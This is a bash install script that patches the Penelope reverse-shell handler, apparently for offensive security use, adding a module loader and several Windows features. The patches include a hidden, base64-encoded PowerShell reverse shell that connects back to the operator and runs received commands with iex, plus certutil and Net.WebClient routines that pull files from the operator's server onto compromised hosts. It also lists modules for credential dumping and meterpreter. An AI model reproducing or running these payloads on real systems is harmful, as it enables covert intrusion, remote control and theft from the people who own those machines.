#!/usr/bin/env bash
set -euo pipefail

if command -v pipx &>/dev/null; then
    _pipx_venvs="$(pipx environment 2>/dev/null | sed -n 's/^PIPX_LOCAL_VENVS=//p')"
fi
PIPX_LOCAL_VENVS="${_pipx_venvs:-${PIPX_HOME:-$HOME/.local/share/pipx}/venvs}"

# Package may be named 'penelope' or 'penelope-shell-handler' depending on version
for _pkg in penelope-shell-handler penelope; do
    _candidate="$PIPX_LOCAL_VENVS/$_pkg/bin/python3"
    if [ -x "$_candidate" ]; then
        PIPX_PYTHON="$_candidate"
        break
    fi
done

if [ -z "${PIPX_PYTHON:-}" ]; then
    echo "[!] Could not find penelope pipx venv (tried: penelope-shell-handler, penelope)" >&2
    exit 1
fi

PY="$PIPX_PYTHON"
PENELOPE_BIN="$(dirname "$PIPX_PYTHON")"

# Older versions copied penelope.py into bin/; newer versions keep it in site-packages only.
# Prefer bin/ if it exists (it takes precedence on sys.path[0]), else fall back to site-packages.
if [ -f "$PENELOPE_BIN/penelope.py" ]; then
    PENELOPE_PY="$PENELOPE_BIN/penelope.py"
else
    PENELOPE_PY="$("$PY" -c "import importlib.util; print(importlib.util.find_spec('penelope').origin)")"
fi

if [ ! -f "$PENELOPE_PY" ]; then
    echo "[!] penelope.py not found" >&2
    exit 1
fi

MODULE_LINK="$(dirname "$PENELOPE_PY")/penelopeplus_modules"
MODULES_SRC="$(cd "$(dirname "$0")/modules" && pwd)"

# --- backup original penelope.py (only if no backup exists yet) ---
PENELOPE_BAK="${PENELOPE_PY}.bak"
if [ ! -f "$PENELOPE_BAK" ]; then
    cp "$PENELOPE_PY" "$PENELOPE_BAK"
fi

# --- symlink modules dir ---
if [ -L "$MODULE_LINK" ]; then
    ln -sfn "$MODULES_SRC" "$MODULE_LINK"
elif [ -e "$MODULE_LINK" ]; then
    echo "[!] $MODULE_LINK exists and is not a symlink. Remove it manually." >&2
    exit 1
else
    ln -s "$MODULES_SRC" "$MODULE_LINK"
fi

# --- inject loader block ---
LOADER_MARKER="# PenelopePlus loader"
LOADER_VERSION="v13"
"$PY" - "$PENELOPE_PY" "$LOADER_MARKER" "$LOADER_VERSION" <<'PYEOF'
import sys, pathlib

target = pathlib.Path(sys.argv[1])
marker = sys.argv[2]
version = sys.argv[3]

end_marker = f"{marker} end"

loader_block = f"""
{marker} {version}
import importlib.util as _pp_ilu, pathlib as _pp_pl, gc as _pp_gc
_pp_dir = _pp_pl.Path(__file__).parent / "penelopeplus_modules"
_pp_loaded = {{}}

def _pp_reload():
    _pp_loaded.clear()
    _pp_gc.collect()
    if not _pp_dir.exists():
        return
    for _pp_f in sorted(_pp_dir.glob("*.py")):
        _pp_spec = _pp_ilu.spec_from_file_location(_pp_f.stem, _pp_f)
        _pp_mod = _pp_ilu.module_from_spec(_pp_spec)
        _pp_spec.loader.exec_module(_pp_mod)
        _pp_loaded[_pp_f.stem] = _pp_mod

_pp_orig_modules = modules
def modules():
    _pp_reload()
    return _pp_orig_modules()

_pp_reload()
print(f"\\x1b[2K\\r\\x1b[33m[Penelope+]\\x1b[0m {{len(_pp_loaded)}} module(s) loaded", flush=True)

# Stamp os_filter onto built-in Module subclasses that don't declare one
_pp_builtin_filters = {{
    'lse': 'Unix', 'linuxexploitsuggester': 'Unix', 'traitor': 'Unix',
    'uac': 'Unix', 'linux_procmemdump': 'Unix', 'ngrok': 'Unix', 'panix': 'Unix',
    'potato': 'Windows', 'upload_credump_scripts': 'Windows',
    'upload_ad_scripts': 'Windows', 'meterpreter': 'Windows',
}}
for _pp_bname, _pp_bos in _pp_builtin_filters.items():
    _pp_bcls = next((_c for _c in Module.__subclasses__() if _c.__name__ == _pp_bname), None)
    if _pp_bcls is not None and not hasattr(_pp_bcls, 'os_filter'):
        _pp_bcls.os_filter = _pp_bos

# OS-filtered show_modules: table with wrapped description column
def _pp_show_modules():
    import textwrap as _tw
    _sid = getattr(menu, 'sid', None)
    _sess = core.sessions.get(_sid) if _sid else getattr(core, 'attached_session', None)
    _os = _sess.OS if _sess else None
    _mods = sorted(
        (m for m in modules().values()
         if getattr(m, 'enabled', True)
         and not (_os and getattr(m, 'os_filter', None) and m.os_filter != _os)),
        key=lambda m: (m.category, m.__name__)
    )
    if not _mods:
        print("\\n  No modules available\\n")
        return
    _desc_w = 85
    _rows = []
    for _mod in _mods:
        _raw = (_mod.run.__doc__ or "").strip() if _mod.run.__doc__ else ""
        _lines = []
        for _part in _raw.splitlines():
            _wrapped = _tw.wrap(_part.strip(), _desc_w)
            _lines.extend(_wrapped if _wrapped else [""])
        if not _lines:
            _lines = [""]
        _rows.append((_mod.__name__, _mod.category, _lines))
    _w0 = max(max(len(r[0]) for r in _rows), len("Module"))
    _w1 = max(max(len(r[1]) for r in _rows), len("Category"))
    _sep = "─" * _w0 + "─┼─" + "─" * _w1 + "─┼─" + "─" * _desc_w
    _hdr = (str(paint("Module").BRIGHT) + " " * (_w0 - len("Module")) +
            " │ " + str(paint("Category").BRIGHT) + " " * (_w1 - len("Category")) +
            " │ Description")
    print()
    print(indent(_hdr, "  "))
    print(indent(_sep, "  "))
    _row_sep = "─" * _w0 + "─┼─" + "─" * _w1 + "─┼─" + "─" * _desc_w
    for _ri, (_name, _cat, _lines) in enumerate(_rows):
        for _i, _line in enumerate(_lines):
            if _i == 0:
                _row = (str(paint(_name).red) + " " * (_w0 - len(_name)) +
                        " │ " + str(paint(_cat).blue) + " " * (_w1 - len(_cat)) +
                        " │ " + _line)
            else:
                _row = " " * _w0 + " │ " + " " * _w1 + " │ " + _line
            print(indent(_row, "  "))
        if _ri < len(_rows) - 1:
            print(indent(_row_sep, "  "))
    print()
MainMenu.show_modules = staticmethod(_pp_show_modules)
# {end_marker}
"""

text = target.read_text()
lines = text.splitlines(keepends=True)

# Remove existing PenelopePlus loader block if present (between marker and end_marker)
start = None
end = None
for i, line in enumerate(lines):
    if line.strip().startswith(marker) and start is None:
        start = i
    if start is not None and end_marker in line and i > start:
        end = i + 1
        break

if start is not None:
    strip_from = start
    while strip_from > 0 and lines[strip_from - 1].strip() == '':
        strip_from -= 1
    if end is None:
        end = start + 1
    del lines[strip_from:end]

# Find insertion point
insert_at = None
for i, line in enumerate(lines):
    if line.strip() == 'if __name__ == "__main__":':
        insert_at = i
        break

if insert_at is None:
    print("[!] Could not find insertion point", file=sys.stderr)
    sys.exit(1)

lines.insert(insert_at, loader_block)
target.write_text(''.join(lines))
PYEOF

# --- patch prompt: (Penelope) magenta -> (Penelope+) yellow ---
if ! grep -qF "paint('Penelope+').yellow" "$PENELOPE_PY"; then
    "$PY" - "$PENELOPE_PY" <<'PYEOF' >/dev/null
import sys, pathlib

target = pathlib.Path(sys.argv[1])
OLD = "paint('Penelope').magenta"
NEW = "paint('Penelope+').yellow"

text = target.read_text()
if OLD not in text:
    print("[!] Could not find prompt string", file=sys.stderr)
    sys.exit(1)
target.write_text(text.replace(OLD, NEW, 1))
PYEOF
fi

# --- patch write_access(): missing f-string on Windows temp-file write test ---
OLD_WRITE_ACCESS="cmd = 'type nul > {write_test_file}.tmp 2>nul && (echo OK) || (echo NO) & del {write_test_file}.tmp 2>nul'"
if grep -qF "$OLD_WRITE_ACCESS" "$PENELOPE_PY"; then
    "$PY" - "$PENELOPE_PY" <<'PYEOF' >/dev/null
import sys, pathlib

target = pathlib.Path(sys.argv[1])
OLD = "cmd = 'type nul > {write_test_file}.tmp 2>nul && (echo OK) || (echo NO) & del {write_test_file}.tmp 2>nul'"
NEW = "cmd = f'type nul > {write_test_file}.tmp 2>nul && (echo OK) || (echo NO) & del {write_test_file}.tmp 2>nul'"

text = target.read_text()
if OLD not in text:
    sys.exit(0)
target.write_text(text.replace(OLD, NEW, 1))
PYEOF
fi

# --- patch upload(): Windows PSH — bypass bat file, exec Net.WebClient + Expand-Archive directly ---
if ! grep -qF 'PSH: exec directly' "$PENELOPE_PY"; then
    "$PY" - "$PENELOPE_PY" <<'PYEOF' >/dev/null
import sys, pathlib, re

target = pathlib.Path(sys.argv[1])
text = target.read_text()

pat = re.compile(
    r"(\t+)fetch_cmd = f'certutil -urlcache.*?DOWNLOAD OK'\n"
    r"\t+unzip_cmd = f'mshta.*?UNZIP OK'\n"
    r"(?:.*?\n)*?"
    r"\t+if not \"UNZIP OK\" in response:\n"
    r"\t+logger\.error.*?\n"
    r"\t+return \[\]\n",
    re.DOTALL
)

m = pat.search(text)
if not m:
    print("[!] Cannot locate mshta upload block", file=sys.stderr)
    sys.exit(1)

raw_indent = re.match(r'(\t+)', m.group(1)).group(1)
i = raw_indent

replacement = (
    f"{i}# Use resolved self.tmp consistently — %TEMP% literal can diverge in WinRM\n"
    f"{i}temp_zip_remote = f'{{self.tmp}}\\\\{{temp_remote_file_zip}}'\n"
    f"{i}if self.subtype == 'psh':\n"
    f"{i}\t# PSH: exec directly — bat files run in cmd.exe so PSH commands silently fail there\n"
    f"{i}\tdl = self.exec(\n"
    f"{i}\t\tf'(New-Object Net.WebClient).DownloadFile('\n"
    f"{i}\t\tf'\"http://{{self._host}}:{{server.port}}{{urlpath_zip}}\",\"{{temp_zip_remote}}\"); '\n"
    f"{i}\t\tf'if (Test-Path \"{{temp_zip_remote}}\") {{{{ Write-Output \"DOWNLOAD OK\" }}}}',\n"
    f"{i}\t\tvalue=True, timeout=None)\n"
    f"{i}\tif not dl or 'DOWNLOAD OK' not in dl:\n"
    f"{i}\t\tlogger.error('Data transfer failed...')\n"
    f"{i}\t\treturn []\n"
    f"{i}\tex = self.exec(\n"
    f"{i}\t\tf'Expand-Archive -Path \"{{temp_zip_remote}}\" -DestinationPath \"{{destination}}\" -Force; '\n"
    f"{i}\t\tf'Remove-Item \"{{temp_zip_remote}}\" -Force; Write-Output \"UNZIP OK\"',\n"
    f"{i}\t\tvalue=True, timeout=None)\n"
    f"{i}\tif not ex or 'UNZIP OK' not in ex:\n"
    f"{i}\t\tlogger.error('Data unpacking failed...')\n"
    f"{i}\t\treturn []\n"
    f"{i}else:\n"
    f"{i}\t# CMD: bat file — certutil download + tar extract (Windows 10+)\n"
    f"{i}\tfetch_cmd = (\n"
    f"{i}\t\tf'certutil -urlcache -split -f '\n"
    f"{i}\t\tf'\"http://{{self._host}}:{{server.port}}{{urlpath_zip}}\" \"{{temp_zip_remote}}\" && echo DOWNLOAD OK'\n"
    f"{i}\t)\n"
    f"{i}\tunzip_cmd = f'tar -xf \"{{temp_zip_remote}}\" -C \"{{destination}}\" && del \"{{temp_zip_remote}}\" && echo UNZIP OK'\n"
    f"{i}\twith open(tempfile_bat, 'w') as _bf:\n"
    f"{i}\t\t_bf.write(fetch_cmd + '\\n')\n"
    f"{i}\t\t_bf.write(unzip_cmd)\n"
    f"{i}\turlpath_bat = server.add(tempfile_bat)\n"
    f"{i}\ttemp_remote_file_bat = urlpath_bat.split('/')[-1]\n"
    f"{i}\tresponse = self.exec(\n"
    f"{i}\t\tf'certutil -urlcache -split -f \"http://{{self._host}}:{{server.port}}{{urlpath_bat}}\" '\n"
    f"{i}\t\tf'\"%TEMP%\\\\{{temp_remote_file_bat}}\"&\"%TEMP%\\\\{{temp_remote_file_bat}}\"&del \"%TEMP%\\\\{{temp_remote_file_bat}}\"',\n"
    f"{i}\t\tforce_cmd=True, value=True, timeout=None)\n"
    f"{i}\tif not response:\n"
    f"{i}\t\tlogger.error('Upload initialization failed...')\n"
    f"{i}\t\treturn []\n"
    f"{i}\tif 'DOWNLOAD OK' not in response:\n"
    f"{i}\t\tlogger.error('Data transfer failed...')\n"
    f"{i}\t\treturn []\n"
    f"{i}\tif 'UNZIP OK' not in response:\n"
    f"{i}\t\tlogger.error('Data unpacking failed...')\n"
    f"{i}\t\treturn []\n"
)

new_text = text[:m.start()] + replacement + text[m.end():]
target.write_text(new_text)
PYEOF
fi

# --- patch tmp property: use $env:TEMP for PSH sessions ---
OLD_TMP='self._tmp = self.exec("echo %TEMP%", force_cmd=True, value=True)'
NEW_TMP='self._tmp = self.exec("$env:TEMP", value=True) if self.subtype == "psh" else self.exec("echo %TEMP%", force_cmd=True, value=True)'
if grep -qF "$OLD_TMP" "$PENELOPE_PY"; then
    "$PY" - "$PENELOPE_PY" "$OLD_TMP" "$NEW_TMP" <<'PYEOF' >/dev/null
import sys, pathlib

target = pathlib.Path(sys.argv[1])
OLD = sys.argv[2]
NEW = sys.argv[3]

text = target.read_text()
if OLD not in text:
    sys.exit(0)
target.write_text(text.replace(OLD, NEW, 1))
PYEOF
fi

# --- patch spawn(): Windows PowerShell reverse shell ---
if grep -qF "Spawn Windows shells is not implemented yet" "$PENELOPE_PY"; then
    "$PY" - "$PENELOPE_PY" <<'PYEOF' >/dev/null
import sys, pathlib

target = pathlib.Path(sys.argv[1])
text = target.read_text()

OLD = "\t\telif self.OS == 'Windows':\n\t\t\tlogger.warning(\"Spawn Windows shells is not implemented yet\")\n\t\t\treturn False"

NEW = """\t\telif self.OS == 'Windows':
\t\t\tport = port or self._port
\t\t\thost = host or self._host
\t\t\tif not next((l for l in core.listeners.values() if l.port == port), None):
\t\t\t\tTCPListener(host, port)
\t\t\timport base64 as _b64
\t\t\t_cmd = (
\t\t\t\tf"$c=New-Object Net.Sockets.TCPClient('{host}',{port});"
\t\t\t\tf"$s=$c.GetStream();"
\t\t\t\tf"[byte[]]$b=0..65535|%{{0}};"
\t\t\t\tf"while(($i=$s.Read($b,0,$b.Length))-ne 0){{"
\t\t\t\tf"$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);"
\t\t\t\tf"$e=(iex $d 2>&1|Out-String);"
\t\t\t\tf"$f=$e+'PS '+(pwd).Path+'> ';"
\t\t\t\tf"$n=([Text.Encoding]::ASCII).GetBytes($f);"
\t\t\t\tf"$s.Write($n,0,$n.Length);"
\t\t\t\tf"$s.Flush()}};"
\t\t\t\tf"$c.Close()"
\t\t\t)
\t\t\t_enc = _b64.b64encode(_cmd.encode('utf-16-le')).decode()
\t\t\tlogger.info(f"Spawning PowerShell reverse shell to {host}:{port}")
\t\t\tself.exec(f'start /b "" powershell -nop -w hidden -e {_enc}', force_cmd=True)"""

if OLD not in text:
    print("[!] Could not find Windows spawn block", file=sys.stderr)
    sys.exit(1)

target.write_text(text.replace(OLD, NEW, 1))
PYEOF
fi

echo "[+] Installed. Modules directory: $MODULES_SRC"
